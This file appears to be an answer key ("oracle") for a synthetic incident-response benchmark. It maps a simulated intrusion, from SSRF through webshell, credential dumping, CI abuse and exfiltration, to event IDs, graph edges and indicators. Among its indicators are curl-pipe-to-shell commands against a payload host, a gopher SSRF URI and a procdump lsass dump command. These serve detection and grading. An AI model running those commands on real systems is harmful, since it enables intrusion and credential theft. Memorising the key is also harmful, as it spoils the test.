@@ -1,0 +1,1233 @@
+{
+  "oracle_version": "1.0",
+  "scope": "Independent source-derived correctness oracle. It is intentionally separate from reference/high_confidence.json and binds every expected fact to raw event IDs and source-field assertions.",
+  "claim_caveats": [
+    {
+      "id": "C01",
+      "scope": "edge:G20",
+      "classification": "inferred",
+      "reason": "The credential-file read is direct; mapping it to svc_deploy is correlated with later GitLab activity."
+    },
+    {
+      "id": "C02",
+      "scope": "edge:G24",
+      "classification": "corroborative",
+      "reason": "The Jenkins trigger and later runner execution are temporally correlated rather than joined by a shared raw request ID."
+    },
+    {
+      "id": "C03",
+      "scope": "edge:G26",
+      "classification": "inferred",
+      "reason": "The token-file read is direct; its full Kubernetes service-account identity is supplied by later token use."
+    },
+    {
+      "id": "C04",
+      "scope": "ioc:domain:archive-sync-bkt.storage.example",
+      "classification": "corroborative",
+      "reason": "The proxy supplies the domain while the paired firewall record supplies the destination IP."
+    },
+    {
+      "id": "C05",
+      "scope": "ioc:file:c:\\temp\\finance_q2.7z",
+      "classification": "corroborative",
+      "reason": "The archive filename is present in process telemetry; the paired netflow only corroborates transfer."
+    },
+    {
+      "id": "C06",
+      "scope": "artifact-pcap-20260706-072073",
+      "classification": "alias",
+      "reason": "PCAP HTTP Host is update-cache.example while proxy telemetry records https://203.0.113.60/a.sh; treat as virtual-host/proxy alias, not a hostname equality assertion."
+    }
+  ],
+  "negative_events": [
+    "waf-20260706-096001",
+    "fw-20260706-144001",
+    "jenkins-20260706-018030",
+    "jenkins-20260706-018062",
+    "auth-web-20260706-016877",
+    "auth-ops-20260706-016878",
+    "netflow-20260706-152005",
+    "edr-20260706-010140",
+    "proxy-20260706-112003"
+  ],
+  "negative_assertions": [
+    {
+      "event_id": "waf-20260706-096001",
+      "fields": {
+        "client_ip": "10.20.90.21",
+        "raw": "authorized vulnerability scan",
+        "rule_id": "WAF-LEGIT-SCAN",
+        "user_agent": "CorpVulnScanner/6.2"
+      }
+    },
+    {
+      "event_id": "fw-20260706-144001",
+      "fields": {
+        "raw": "scheduled scanner traffic",
+        "rule": "allow-security-scan",
+        "src_ip": "10.20.90.21"
+      }
+    },
+    {
+      "event_id": "jenkins-20260706-018030",
+      "fields": {
+        "actor": "admin.li",
+        "raw": "normal release window",
+        "result": "success"
+      }
+    },
+    {
+      "event_id": "jenkins-20260706-018062",
+      "fields": {
+        "actor": "admin.li",
+        "raw": "normal release window",
+        "result": "success"
+      }
+    },
+    {
+      "event_id": "auth-web-20260706-016877",
+      "raw_contains": "Failed password for invalid user deploy"
+    },
+    {
+      "event_id": "auth-ops-20260706-016878",
+      "raw_contains": "Failed password for invalid user root"
+    },
+    {
+      "event_id": "netflow-20260706-152005",
+      "fields": {
+        "raw": "failed smb attempt to backup nas",
+        "dst_port": "445"
+      }
+    },
+    {
+      "event_id": "edr-20260706-010140",
+      "fields": {
+        "alert_name": "Denied SMB access from jump host",
+        "raw": "backup nas rejected access attempt"
+      }
+    },
+    {
+      "event_id": "proxy-20260706-112003",
+      "fields": {
+        "raw": "large backup upload by ci runner",
+        "user": "gitlab-runner",
+        "url": "https://archive-sync-bkt.storage.example/upload/erp_full_20260705.tar.zst"
+      }
+    }
+  ],
+  "source_assertions": [
+    {
+      "event_id": "proxy-20260706-112001",
+      "fields": {
+        "src_ip": "10.20.10.21",
+        "url": "https://203.0.113.60/a.sh"
+      }
+    },
+    {
+      "event_id": "k8s-20260706-018130",
+      "fields": {
+        "action": "token_review",
+        "actor": "system:serviceaccount:prod:ci-runner",
+        "src_ip": "10.20.60.41"
+      }
+    },
+    {
+      "event_id": "obj-20260706-017768",
+      "fields": {
+        "action": "list_bucket",
+        "actor": "role/oss-backup-reader",
+        "resource": "bucket/prod-backup"
+      }
+    },
+    {
+      "event_id": "iam-20260706-018161",
+      "fields": {
+        "action": "assume_role",
+        "actor": "system:serviceaccount:prod:ci-runner",
+        "resource": "role/oss-backup-reader"
+      }
+    },
+    {
+      "event_id": "gitlab-20260706-017586",
+      "fields": {
+        "action": "pipeline_create",
+        "actor": "svc_deploy",
+        "src_ip": "10.20.30.11"
+      }
+    },
+    {
+      "event_id": "audit-ci-20260706-000001",
+      "fields": {
+        "host": "ci-runner-01",
+        "user": "gitlab-runner",
+        "result": "success"
+      }
+    }
+  ],
+  "artifact_assertions": [
+    {
+      "event_id": "artifact-pcap-20260706-072042",
+      "fields": {
+        "src_ip": "198.51.100.77",
+        "dst_ip": "10.20.10.21",
+        "http_method": "POST",
+        "http_host": "oa.example",
+        "http_uri": "/oa/preview?url=gopher://127.0.0.1:6379/_eval"
+      }
+    },
+    {
+      "event_id": "artifact-pcap-20260706-072073",
+      "fields": {
+        "src_ip": "10.20.10.21",
+        "dst_ip": "203.0.113.60",
+        "http_method": "GET",
+        "http_host": "update-cache.example",
+        "http_uri": "/a.sh"
+      }
+    },
+    {
+      "event_id": "artifact-pcap-20260706-073875",
+      "fields": {
+        "src_ip": "10.20.30.11",
+        "dst_ip": "203.0.113.77"
+      }
+    },
+    {
+      "event_id": "artifact-winsec-20260706-000001",
+      "fields": {
+        "TargetUserName": "svc_backup",
+        "TargetDomainName": "CORP",
+        "IpAddress": "10.20.30.11",
+        "LogonType": "3",
+        "Status": "0x0"
+      }
+    },
+    {
+      "event_id": "artifact-winsec-20260706-000002",
+      "fields": {
+        "TargetUserName": "svc_backup",
+        "ServiceName": "ldap/ad-dc-01",
+        "IpAddress": "10.20.30.11",
+        "Status": "0x0"
+      }
+    },
+    {
+      "event_id": "artifact-winsec-20260706-000003",
+      "fields": {
+        "TargetUserName": "svc_backup",
+        "TargetDomainName": "CORP",
+        "IpAddress": "10.20.30.11",
+        "LogonType": "10",
+        "Status": "0x0"
+      }
+    },
+    {
+      "event_id": "artifact-sysmon-20260706-000001",
+      "fields": {
+        "Image": "C:\\Windows\\Temp\\procdump.exe",
+        "CommandLine": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\ls.dmp",
+        "User": "CORP\\svc_backup"
+      }
+    },
+    {
+      "event_id": "artifact-sysmon-20260706-000002",
+      "fields": {
+        "Image": "C:\\Windows\\System32\\robocopy.exe",
+        "TargetFilename": "C:\\Temp\\f",
+        "User": "CORP\\svc_backup"
+      }
+    }
+  ],
+  "timeline_steps": [
+    {
+      "id": "S01",
+      "stage": "recon",
+      "event_ids": [
+        "waf-20260706-096141",
+        "waf-20260706-096142",
+        "waf-20260706-096143",
+        "waf-20260706-096144",
+        "waf-20260706-096145",
+        "fw-20260706-144141",
+        "fw-20260706-144142",
+        "fw-20260706-144143",
+        "fw-20260706-144144",
+        "fw-20260706-144145"
+      ]
+    },
+    {
+      "id": "S02",
+      "stage": "initial_access",
+      "event_ids": [
+        "waf-20260706-096146",
+        "nginx-20260706-000001",
+        "oa-20260706-017559",
+        "artifact-pcap-20260706-072042"
+      ]
+    },
+    {
+      "id": "S03",
+      "stage": "execution",
+      "event_ids": [
+        "audit-web-20260706-024801",
+        "proxy-20260706-112001",
+        "artifact-pcap-20260706-072073"
+      ]
+    },
+    {
+      "id": "S04",
+      "stage": "execution",
+      "event_ids": [
+        "fw-20260706-144146",
+        "edr-20260706-010135"
+      ]
+    },
+    {
+      "id": "S05",
+      "stage": "persistence",
+      "event_ids": [
+        "audit-web-20260706-024802",
+        "nginx-20260706-000002",
+        "edr-20260706-010136"
+      ]
+    },
+    {
+      "id": "S06",
+      "stage": "discovery",
+      "event_ids": [
+        "audit-web-20260706-024803",
+        "audit-web-20260706-024804",
+        "audit-web-20260706-024805",
+        "audit-web-20260706-024806",
+        "audit-web-20260706-024807"
+      ]
+    },
+    {
+      "id": "S07",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-web-20260706-024808",
+        "audit-web-20260706-024809",
+        "audit-web-20260706-024810"
+      ]
+    },
+    {
+      "id": "S08",
+      "stage": "lateral_movement",
+      "event_ids": [
+        "fw-20260706-144147",
+        "auth-ops-20260706-016892",
+        "netflow-20260706-152001"
+      ]
+    },
+    {
+      "id": "S09",
+      "stage": "discovery",
+      "event_ids": [
+        "audit-ops-20260706-024801",
+        "audit-ops-20260706-024802",
+        "audit-ops-20260706-024803"
+      ]
+    },
+    {
+      "id": "S10",
+      "stage": "credential_use",
+      "event_ids": [
+        "mysql-20260706-036001",
+        "fw-20260706-144148"
+      ]
+    },
+    {
+      "id": "S11",
+      "stage": "discovery",
+      "event_ids": [
+        "mysql-20260706-036002",
+        "mysql-20260706-036003",
+        "mysql-20260706-036004",
+        "mysql-20260706-036005"
+      ]
+    },
+    {
+      "id": "S12",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-ops-20260706-024804",
+        "audit-ops-20260706-024805",
+        "audit-ops-20260706-024806"
+      ]
+    },
+    {
+      "id": "S13",
+      "stage": "credential_access",
+      "event_ids": [
+        "mysql-20260706-036006",
+        "edr-20260706-010138"
+      ]
+    },
+    {
+      "id": "S14",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-ops-20260706-024807"
+      ]
+    },
+    {
+      "id": "S15",
+      "stage": "credential_use",
+      "event_ids": [
+        "gitlab-20260706-017582"
+      ]
+    },
+    {
+      "id": "S16",
+      "stage": "discovery",
+      "event_ids": [
+        "netflow-20260706-152002"
+      ]
+    },
+    {
+      "id": "S17",
+      "stage": "credential_use",
+      "event_ids": [
+        "winsec-ad-20260706-000001",
+        "winsec-ad-20260706-000002",
+        "artifact-winsec-20260706-000001",
+        "artifact-winsec-20260706-000002"
+      ]
+    },
+    {
+      "id": "S18",
+      "stage": "discovery",
+      "event_ids": [
+        "gitlab-20260706-017583",
+        "gitlab-20260706-017584",
+        "gitlab-20260706-017585"
+      ]
+    },
+    {
+      "id": "S19",
+      "stage": "credential_use",
+      "event_ids": [
+        "pgsql-20260706-028001",
+        "netflow-20260706-152004"
+      ]
+    },
+    {
+      "id": "S20",
+      "stage": "discovery",
+      "event_ids": [
+        "sysmon-ad-20260706-000001",
+        "sysmon-ad-20260706-000002",
+        "sysmon-ad-20260706-000003"
+      ]
+    },
+    {
+      "id": "S21",
+      "stage": "execution",
+      "event_ids": [
+        "gitlab-20260706-017586",
+        "jenkins-20260706-018063"
+      ]
+    },
+    {
+      "id": "S22",
+      "stage": "collection",
+      "event_ids": [
+        "pgsql-20260706-028002",
+        "pgsql-20260706-028003",
+        "pgsql-20260706-028004"
+      ]
+    },
+    {
+      "id": "S23",
+      "stage": "lateral_movement",
+      "event_ids": [
+        "winsec-win-20260706-024842",
+        "artifact-winsec-20260706-000003"
+      ]
+    },
+    {
+      "id": "S24",
+      "stage": "credential_use",
+      "event_ids": [
+        "winsec-win-20260706-024843"
+      ]
+    },
+    {
+      "id": "S25",
+      "stage": "execution",
+      "event_ids": [
+        "audit-ci-20260706-000001",
+        "edr-20260706-010139"
+      ]
+    },
+    {
+      "id": "S26",
+      "stage": "credential_access",
+      "event_ids": [
+        "sysmon-win-20260706-024801",
+        "artifact-sysmon-20260706-000001",
+        "edr-20260706-010137"
+      ]
+    },
+    {
+      "id": "S27",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-ci-20260706-000002"
+      ]
+    },
+    {
+      "id": "S28",
+      "stage": "credential_use",
+      "event_ids": [
+        "k8s-20260706-018130"
+      ]
+    },
+    {
+      "id": "S29",
+      "stage": "discovery",
+      "event_ids": [
+        "k8s-20260706-018131",
+        "k8s-20260706-018132",
+        "k8s-20260706-018133"
+      ]
+    },
+    {
+      "id": "S30",
+      "stage": "collection",
+      "event_ids": [
+        "winsec-fil-20260706-024848",
+        "sysmon-fil-20260706-024801",
+        "artifact-sysmon-20260706-000002"
+      ]
+    },
+    {
+      "id": "S31",
+      "stage": "credential_use",
+      "event_ids": [
+        "iam-20260706-018161"
+      ]
+    },
+    {
+      "id": "S32",
+      "stage": "discovery",
+      "event_ids": [
+        "obj-20260706-017768"
+      ]
+    },
+    {
+      "id": "S33",
+      "stage": "collection",
+      "event_ids": [
+        "sysmon-win-20260706-024802",
+        "netflow-20260706-152003"
+      ]
+    },
+    {
+      "id": "S34",
+      "stage": "exfiltration",
+      "event_ids": [
+        "proxy-20260706-112002",
+        "fw-20260706-144149"
+      ]
+    },
+    {
+      "id": "S35",
+      "stage": "collection",
+      "event_ids": [
+        "obj-20260706-017769"
+      ]
+    },
+    {
+      "id": "S36",
+      "stage": "collection",
+      "event_ids": [
+        "audit-ops-20260706-024808",
+        "audit-ops-20260706-024809",
+        "audit-ops-20260706-024810"
+      ]
+    },
+    {
+      "id": "S37",
+      "stage": "defense_evasion",
+      "event_ids": [
+        "audit-ops-20260706-024811",
+        "audit-ops-20260706-024812",
+        "audit-ops-20260706-024813"
+      ]
+    },
+    {
+      "id": "S38",
+      "stage": "exfiltration",
+      "event_ids": [
+        "dns-20260706-144001",
+        "proxy-20260706-112004",
+        "fw-20260706-144150",
+        "ids-20260706-010047",
+        "artifact-pcap-20260706-073875"
+      ]
+    }
+  ],
+  "nodes": [
+    {"id": "ip:198.51.100.77", "type": "ip", "label": "initial attacker"},
+    {"id": "ip:203.0.113.60", "type": "ip", "label": "payload host"},
+    {"id": "host:web-prod-01", "type": "host", "label": "web-prod-01"},
+    {"id": "host:ops-jump-01", "type": "host", "label": "ops-jump-01"},
+    {"id": "host:ad-dc-01", "type": "host", "label": "ad-dc-01"},
+    {"id": "host:win-admin-01", "type": "host", "label": "win-admin-01"},
+    {"id": "host:file-srv-01", "type": "host", "label": "file-srv-01"},
+    {"id": "host:gitlab-01", "type": "host", "label": "gitlab-01"},
+    {"id": "host:jenkins-01", "type": "host", "label": "jenkins-01"},
+    {"id": "host:ci-runner-01", "type": "host", "label": "ci-runner-01"},
+    {"id": "database:mysql-core-01", "type": "database", "label": "mysql-core-01"},
+    {"id": "database:pgsql-bi-01", "type": "database", "label": "pgsql-bi-01"},
+    {"id": "domain:archive-sync-bkt.storage.example", "type": "domain", "label": "archive-sync-bkt.storage.example"},
+    {"id": "domain:cdn-sync.example", "type": "domain", "label": "cdn-sync.example"},
+    {"id": "file:/var/www/oa/public/.cache.php", "type": "file", "label": "/var/www/oa/public/.cache.php"},
+    {"id": "file:C:\\Temp\\finance_q2.7z", "type": "file", "label": "C:\\Temp\\finance_q2.7z"},
+    {"id": "file:/tmp/.cache/.stage/full.tar", "type": "file", "label": "/tmp/.cache/.stage/full.tar"},
+    {"id": "process:procdump.exe", "type": "process", "label": "procdump.exe"},
+    {"id": "account:deploy", "type": "account", "label": "deploy"},
+    {"id": "account:crm_ro", "type": "account", "label": "crm_ro"},
+    {"id": "account:svc_deploy", "type": "account", "label": "svc_deploy"},
+    {"id": "account:CORP\\svc_backup", "type": "account", "label": "CORP\\svc_backup"},
+    {"id": "account:bi_sync", "type": "account", "label": "bi_sync"},
+    {"id": "account:role/oss-backup-reader", "type": "account", "label": "role/oss-backup-reader"},
+    {"id": "token:system:serviceaccount:prod:ci-runner", "type": "token", "label": "ci-runner service-account token"},
+    {"id": "cluster:k8s-master-01", "type": "cluster", "label": "k8s-master-01"},
+    {"id": "bucket:prod-backup", "type": "bucket", "label": "prod-backup"}
+  ],
+  "edges": [
+    {
+      "id": "G01",
+      "from": "ip:198.51.100.77",
+      "to": "host:web-prod-01",
+      "action": "scan",
+      "stage": "recon",
+      "event_ids": [
+        "waf-20260706-096141",
+        "waf-20260706-096142",
+        "waf-20260706-096143",
+        "waf-20260706-096144",
+        "waf-20260706-096145",
+        "fw-20260706-144141",
+        "fw-20260706-144142",
+        "fw-20260706-144143",
+        "fw-20260706-144144",
+        "fw-20260706-144145"
+      ]
+    },
+    {
+      "id": "G02",
+      "from": "ip:198.51.100.77",
+      "to": "host:web-prod-01",
+      "action": "exploit_public_service",
+      "stage": "initial_access",
+      "event_ids": [
+        "waf-20260706-096146",
+        "nginx-20260706-000001",
+        "oa-20260706-017559",
+        "artifact-pcap-20260706-072042"
+      ]
+    },
+    {
+      "id": "G03",
+      "from": "host:web-prod-01",
+      "to": "ip:203.0.113.60",
+      "action": "command_execution",
+      "stage": "execution",
+      "event_ids": [
+        "audit-web-20260706-024801",
+        "proxy-20260706-112001",
+        "artifact-pcap-20260706-072073"
+      ]
+    },
+    {
+      "id": "G04",
+      "from": "host:web-prod-01",
+      "to": "ip:198.51.100.77",
+      "action": "command_and_control",
+      "stage": "execution",
+      "event_ids": [
+        "fw-20260706-144146",
+        "edr-20260706-010135"
+      ]
+    },
+    {
+      "id": "G05",
+      "from": "host:web-prod-01",
+      "to": "file:/var/www/oa/public/.cache.php",
+      "action": "webshell_upload",
+      "stage": "persistence",
+      "event_ids": [
+        "audit-web-20260706-024802",
+        "nginx-20260706-000002",
+        "edr-20260706-010136"
+      ]
+    },
+    {
+      "id": "G06",
+      "from": "host:web-prod-01",
+      "to": "account:deploy",
+      "action": "credential_dump",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-web-20260706-024809"
+      ]
+    },
+    {
+      "id": "G07",
+      "from": "account:deploy",
+      "to": "host:ops-jump-01",
+      "action": "lateral_movement",
+      "stage": "lateral_movement",
+      "event_ids": [
+        "fw-20260706-144147",
+        "auth-ops-20260706-016892",
+        "netflow-20260706-152001"
+      ]
+    },
+    {
+      "id": "G08",
+      "from": "host:web-prod-01",
+      "to": "account:crm_ro",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "mysql-20260706-036001",
+        "fw-20260706-144148"
+      ]
+    },
+    {
+      "id": "G09",
+      "from": "account:crm_ro",
+      "to": "database:mysql-core-01",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "mysql-20260706-036001"
+      ]
+    },
+    {
+      "id": "G10",
+      "from": "host:web-prod-01",
+      "to": "database:mysql-core-01",
+      "action": "database_discovery",
+      "stage": "discovery",
+      "event_ids": [
+        "mysql-20260706-036002",
+        "mysql-20260706-036003",
+        "mysql-20260706-036004",
+        "mysql-20260706-036005"
+      ]
+    },
+    {
+      "id": "G11",
+      "from": "host:ops-jump-01",
+      "to": "account:CORP\\svc_backup",
+      "action": "credential_dump",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-ops-20260706-024804",
+        "audit-ops-20260706-024805",
+        "audit-ops-20260706-024806"
+      ]
+    },
+    {
+      "id": "G12",
+      "from": "account:CORP\\svc_backup",
+      "to": "host:ad-dc-01",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "winsec-ad-20260706-000001",
+        "winsec-ad-20260706-000002",
+        "artifact-winsec-20260706-000001",
+        "artifact-winsec-20260706-000002"
+      ]
+    },
+    {
+      "id": "G13",
+      "from": "host:ops-jump-01",
+      "to": "host:ad-dc-01",
+      "action": "domain_discovery",
+      "stage": "discovery",
+      "event_ids": [
+        "sysmon-ad-20260706-000001",
+        "sysmon-ad-20260706-000002",
+        "sysmon-ad-20260706-000003"
+      ]
+    },
+    {
+      "id": "G14",
+      "from": "host:ops-jump-01",
+      "to": "host:win-admin-01",
+      "action": "lateral_movement",
+      "stage": "lateral_movement",
+      "event_ids": [
+        "winsec-win-20260706-024842",
+        "artifact-winsec-20260706-000003"
+      ]
+    },
+    {
+      "id": "G15",
+      "from": "account:CORP\\svc_backup",
+      "to": "host:win-admin-01",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "winsec-win-20260706-024842",
+        "artifact-winsec-20260706-000003",
+        "winsec-win-20260706-024843"
+      ]
+    },
+    {
+      "id": "G16",
+      "from": "host:win-admin-01",
+      "to": "process:procdump.exe",
+      "action": "credential_dump",
+      "stage": "credential_access",
+      "event_ids": [
+        "sysmon-win-20260706-024801",
+        "artifact-sysmon-20260706-000001",
+        "edr-20260706-010137"
+      ]
+    },
+    {
+      "id": "G17",
+      "from": "host:win-admin-01",
+      "to": "host:file-srv-01",
+      "action": "data_collection",
+      "stage": "collection",
+      "event_ids": [
+        "winsec-fil-20260706-024848",
+        "sysmon-fil-20260706-024801",
+        "artifact-sysmon-20260706-000002"
+      ]
+    },
+    {
+      "id": "G18",
+      "from": "host:win-admin-01",
+      "to": "file:C:\\Temp\\finance_q2.7z",
+      "action": "data_staging",
+      "stage": "collection",
+      "event_ids": [
+        "sysmon-win-20260706-024802"
+      ]
+    },
+    {
+      "id": "G19",
+      "from": "host:win-admin-01",
+      "to": "host:ops-jump-01",
+      "action": "data_staging",
+      "stage": "collection",
+      "event_ids": [
+        "netflow-20260706-152003"
+      ]
+    },
+    {
+      "id": "G20",
+      "from": "host:ops-jump-01",
+      "to": "account:svc_deploy",
+      "action": "credential_dump",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-ops-20260706-024807"
+      ]
+    },
+    {
+      "id": "G21",
+      "from": "account:svc_deploy",
+      "to": "host:gitlab-01",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "gitlab-20260706-017582"
+      ]
+    },
+    {
+      "id": "G22",
+      "from": "host:ops-jump-01",
+      "to": "host:gitlab-01",
+      "action": "devops_discovery",
+      "stage": "discovery",
+      "event_ids": [
+        "gitlab-20260706-017583",
+        "gitlab-20260706-017584",
+        "gitlab-20260706-017585"
+      ]
+    },
+    {
+      "id": "G23",
+      "from": "host:gitlab-01",
+      "to": "host:jenkins-01",
+      "action": "ci_pipeline_execution",
+      "stage": "execution",
+      "event_ids": [
+        "gitlab-20260706-017586",
+        "jenkins-20260706-018063"
+      ]
+    },
+    {
+      "id": "G24",
+      "from": "host:jenkins-01",
+      "to": "host:ci-runner-01",
+      "action": "ci_pipeline_execution",
+      "stage": "execution",
+      "event_ids": [
+        "jenkins-20260706-018063",
+        "audit-ci-20260706-000001",
+        "edr-20260706-010139"
+      ]
+    },
+    {
+      "id": "G25",
+      "from": "host:ci-runner-01",
+      "to": "ip:203.0.113.60",
+      "action": "command_execution",
+      "stage": "execution",
+      "event_ids": [
+        "audit-ci-20260706-000001",
+        "edr-20260706-010139"
+      ]
+    },
+    {
+      "id": "G26",
+      "from": "host:ci-runner-01",
+      "to": "token:system:serviceaccount:prod:ci-runner",
+      "action": "credential_dump",
+      "stage": "credential_access",
+      "event_ids": [
+        "audit-ci-20260706-000002"
+      ]
+    },
+    {
+      "id": "G27",
+      "from": "token:system:serviceaccount:prod:ci-runner",
+      "to": "cluster:k8s-master-01",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "k8s-20260706-018130"
+      ]
+    },
+    {
+      "id": "G28",
+      "from": "token:system:serviceaccount:prod:ci-runner",
+      "to": "cluster:k8s-master-01",
+      "action": "cloud_discovery",
+      "stage": "discovery",
+      "event_ids": [
+        "k8s-20260706-018131",
+        "k8s-20260706-018132",
+        "k8s-20260706-018133"
+      ]
+    },
+    {
+      "id": "G29",
+      "from": "token:system:serviceaccount:prod:ci-runner",
+      "to": "account:role/oss-backup-reader",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "iam-20260706-018161"
+      ]
+    },
+    {
+      "id": "G30",
+      "from": "account:role/oss-backup-reader",
+      "to": "bucket:prod-backup",
+      "action": "cloud_discovery",
+      "stage": "discovery",
+      "event_ids": [
+        "obj-20260706-017768"
+      ]
+    },
+    {
+      "id": "G31",
+      "from": "account:role/oss-backup-reader",
+      "to": "bucket:prod-backup",
+      "action": "cloud_collection",
+      "stage": "collection",
+      "event_ids": [
+        "obj-20260706-017769"
+      ]
+    },
+    {
+      "id": "G32",
+      "from": "host:ops-jump-01",
+      "to": "account:bi_sync",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "pgsql-20260706-028001",
+        "netflow-20260706-152004"
+      ]
+    },
+    {
+      "id": "G33",
+      "from": "account:bi_sync",
+      "to": "database:pgsql-bi-01",
+      "action": "credential_use",
+      "stage": "credential_use",
+      "event_ids": [
+        "pgsql-20260706-028001",
+        "netflow-20260706-152004"
+      ]
+    },
+    {
+      "id": "G34",
+      "from": "account:bi_sync",
+      "to": "database:pgsql-bi-01",
+      "action": "data_collection",
+      "stage": "collection",
+      "event_ids": [
+        "pgsql-20260706-028002",
+        "pgsql-20260706-028003",
+        "pgsql-20260706-028004"
+      ]
+    },
+    {
+      "id": "G35",
+      "from": "host:ops-jump-01",
+      "to": "domain:archive-sync-bkt.storage.example",
+      "action": "exfiltration",
+      "stage": "exfiltration",
+      "event_ids": [
+        "proxy-20260706-112002",
+        "fw-20260706-144149"
+      ]
+    },
+    {
+      "id": "G36",
+      "from": "host:ops-jump-01",
+      "to": "file:/tmp/.cache/.stage/full.tar",
+      "action": "data_staging",
+      "stage": "collection",
+      "event_ids": [
+        "audit-ops-20260706-024808",
+        "audit-ops-20260706-024809",
+        "audit-ops-20260706-024810"
+      ]
+    },
+    {
+      "id": "G37",
+      "from": "host:ops-jump-01",
+      "to": "domain:cdn-sync.example",
+      "action": "exfiltration",
+      "stage": "exfiltration",
+      "event_ids": [
+        "dns-20260706-144001",
+        "proxy-20260706-112004",
+        "fw-20260706-144150",
+        "ids-20260706-010047",
+        "artifact-pcap-20260706-073875"
+      ]
+    }
+  ],
+  "iocs": [
+    {
+      "type": "ip",
+      "value": "198.51.100.77",
+      "related_assets": ["web-prod-01"],
+      "event_ids": [
+        "fw-20260706-144141",
+        "waf-20260706-096146",
+        "nginx-20260706-000002"
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "203.0.113.60",
+      "related_assets": ["web-prod-01", "ci-runner-01"],
+      "event_ids": [
+        "audit-web-20260706-024801",
+        "proxy-20260706-112001",
+        "audit-ci-20260706-000001",
+        "edr-20260706-010139"
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "203.0.113.210",
+      "related_assets": ["ops-jump-01"],
+      "event_ids": [
+        "fw-20260706-144149"
+      ]
+    },
+    {
+      "type": "ip",
+      "value": "203.0.113.77",
+      "related_assets": ["ops-jump-01"],
+      "event_ids": [
+        "dns-20260706-144001",
+        "proxy-20260706-112004",
+        "fw-20260706-144150",
+        "ids-20260706-010047"
+      ]
+    },
+    {
+      "type": "domain",
+      "value": "archive-sync-bkt.storage.example",
+      "related_assets": ["ops-jump-01"],
+      "event_ids": [
+        "proxy-20260706-112002",
+        "fw-20260706-144149"
+      ]
+    },
+    {
+      "type": "domain",
+      "value": "cdn-sync.example",
+      "related_assets": ["ops-jump-01"],
+      "event_ids": [
+        "dns-20260706-144001",
+        "proxy-20260706-112004",
+        "fw-20260706-144150",
+        "ids-20260706-010047",
+        "artifact-pcap-20260706-073875"
+      ]
+    },
+    {
+      "type": "file",
+      "value": "/var/www/oa/public/.cache.php",
+      "related_assets": ["web-prod-01"],
+      "event_ids": [
+        "audit-web-20260706-024802",
+        "nginx-20260706-000002",
+        "edr-20260706-010136"
+      ]
+    },
+    {
+      "type": "file",
+      "value": "c:\\windows\\temp\\ls.dmp",
+      "related_assets": ["win-admin-01"],
+      "event_ids": [
+        "sysmon-win-20260706-024801",
+        "artifact-sysmon-20260706-000001"
+      ]
+    },
+    {
+      "type": "file",
+      "value": "c:\\windows\\temp\\procdump.exe",
+      "related_assets": ["win-admin-01"],
+      "event_ids": [
+        "sysmon-win-20260706-024801",
+        "artifact-sysmon-20260706-000001"
+      ]
+    },
+    {
+      "type": "file",
+      "value": "c:\\temp\\finance_q2.7z",
+      "related_assets": ["win-admin-01", "ops-jump-01"],
+      "event_ids": [
+        "sysmon-win-20260706-024802",
+        "netflow-20260706-152003"
+      ]
+    },
+    {
+      "type": "file",
+      "value": "/tmp/.cache/.stage/full.tar",
+      "related_assets": ["ops-jump-01"],
+      "event_ids": [
+        "audit-ops-20260706-024809",
+        "proxy-20260706-112004"
+      ]
+    },
+    {
+      "type": "account",
+      "value": "deploy",
+      "related_assets": ["web-prod-01", "ops-jump-01"],
+      "event_ids": [
+        "audit-web-20260706-024809",
+        "auth-ops-20260706-016892",
+        "proxy-20260706-112004"
+      ]
+    },
+    {
+      "type": "account",
+      "value": "crm_ro",
+      "related_assets": ["web-prod-01", "mysql-core-01"],
+      "event_ids": [
+        "mysql-20260706-036001",
+        "mysql-20260706-036006"
+      ]
+    },
+    {
+      "type": "account",
+      "value": "svc_deploy",
+      "related_assets": ["ops-jump-01", "gitlab-01", "jenkins-01"],
+      "event_ids": [
+        "audit-ops-20260706-024807",
+        "gitlab-20260706-017582",
+        "jenkins-20260706-018063"
+      ]
+    },
+    {
+      "type": "account",
+      "value": "corp\\svc_backup",
+      "related_assets": ["ops-jump-01", "ad-dc-01", "win-admin-01", "file-srv-01"],
+      "event_ids": [
+        "winsec-ad-20260706-000001",
+        "winsec-win-20260706-024843",
+        "sysmon-fil-20260706-024801",
+        "sysmon-win-20260706-024802",
+        "netflow-20260706-152003"
+      ]
+    },
+    {
+      "type": "account",
+      "value": "bi_sync",
+      "related_assets": ["ops-jump-01", "pgsql-bi-01"],
+      "event_ids": [
+        "pgsql-20260706-028001",
+        "pgsql-20260706-028004"
+      ]
+    },
+    {
+      "type": "account",
+      "value": "role/oss-backup-reader",
+      "related_assets": ["ci-runner-01", "prod-backup"],
+      "event_ids": [
+        "iam-20260706-018161",
+        "obj-20260706-017768",
+        "obj-20260706-017769"
+      ]
+    },
+    {
+      "type": "token",
+      "value": "system:serviceaccount:prod:ci-runner",
+      "related_assets": ["ci-runner-01", "k8s-master-01"],
+      "event_ids": [
+        "audit-ci-20260706-000002",
+        "k8s-20260706-018130",
+        "iam-20260706-018161"
+      ]
+    },
+    {
+      "type": "command",
+      "value": "bash -c curl -fsSL https://203.0.113.60/a.sh | sh",
+      "related_assets": ["web-prod-01"],
+      "event_ids": [
+        "audit-web-20260706-024801"
+      ]
+    },
+    {
+      "type": "command",
+      "value": "bash -c curl -fsSL https://203.0.113.60/ci.sh | bash",
+      "related_assets": ["ci-runner-01"],
+      "event_ids": [
+        "audit-ci-20260706-000001"
+      ]
+    },
+    {
+      "type": "command",
